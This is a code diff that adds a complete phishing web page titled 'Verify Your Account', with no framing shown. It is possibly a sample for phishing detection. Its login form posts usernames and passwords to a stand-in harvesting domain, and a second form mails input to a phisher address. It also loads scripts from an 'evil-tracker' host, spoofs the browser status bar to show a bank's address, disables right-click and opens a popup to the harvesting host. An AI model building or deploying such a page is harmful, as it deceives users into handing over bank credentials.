@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verify Your Account</title>
+    <script src="https://cdn.evil-tracker.net/analytics.js"></script>
+    <link rel="stylesheet" href="https://cdn.evil-tracker.net/style.css">
+</head>
+<body onmouseover="window.status='https://your-bank.com'; return true;">
+    <form action="https://harvest.totally-different-domain.net/collect" method="post">
+        <input type="text" name="user">
+        <input type="password" name="pwd">
+    </form>
+    <form action="mailto:phisher@evil-domain.net">
+        <input type="text" name="notes">
+    </form>
+    <script>
+        document.oncontextmenu = function() { return false; };
+        function launchPopup() {
+            window.open("https://harvest.totally-different-domain.net/popup", "_blank", "width=300,height=200");
+        }
+    </script>
+</body>
+</html>
